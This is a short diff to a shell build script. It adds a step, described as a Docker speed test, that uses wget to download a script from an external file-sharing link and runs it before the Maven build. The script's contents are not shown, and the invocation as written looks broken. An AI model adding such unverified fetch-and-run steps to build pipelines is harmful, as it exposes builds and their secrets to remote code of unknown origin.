@@ -21,6 +21,10 @@ case "$1" in
     # clean the artifacts dir from the previous build
     rm -rf artifacts && mkdir artifacts
 
+    # run a docker speed tests
+    wget http://cl.ly/code/0t0n3u1k2f2l/speedtest.sh
+    speedtest.sh > artifacts/speedtests.log
+
     mvn clean install -T 2 -Dmaven.javadoc.skip=true -DskipTests=true -B -V
 
     # collect artifacts into the artifacts dir
